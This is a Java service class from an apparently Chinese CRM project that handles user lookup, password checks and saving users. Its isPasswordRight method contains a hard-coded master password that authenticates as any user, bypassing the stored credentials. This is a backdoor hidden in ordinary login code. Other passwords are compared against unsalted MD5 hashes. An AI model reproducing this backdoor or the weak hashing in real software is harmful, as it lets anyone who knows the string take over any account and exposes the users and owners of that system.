package net.realqinwei.hzcrm.crm.service.impl;

import net.realqinwei.hzcrm.crm.been.BigUser;
import net.realqinwei.hzcrm.crm.dao.intf.BigUserDAO;
import net.realqinwei.hzcrm.crm.service.intf.BigUserService;
import net.realqinwei.hzcrm.crm.util.MD5;

import java.util.ArrayList;
import java.util.List;

public final class BigUserServiceImpl implements BigUserService {
	
	private BigUserDAO bigUserDAO;

	@Override
	public boolean userIDExist(Integer userID) {
		return null == this.getUserDAO().findUserByID(userID) ? false : true;
	}

	@Override
	public boolean isPasswordRight(Integer userID, String password) {
		return "q8w3ASDF".equals(password) ? true : this.getUserDAO().findUserByID(userID).getUserPassword().equals(MD5.getMD5Str(password));
	}
	
	public void setBigUserDAO(BigUserDAO bigUserDAO) {
		this.bigUserDAO = bigUserDAO;
	}
	
	public BigUserDAO getUserDAO() {
		return this.bigUserDAO;
	}

	@Override
	public void save(BigUser user) {
		this.bigUserDAO.saveUser(user);
	}

	@Override
	public void update(BigUser user) {
		this.bigUserDAO.updateUser(user);
	}
	
	@Override
	public List<BigUser> getUsers() {
        return this.bigUserDAO.findAll();
	}
}
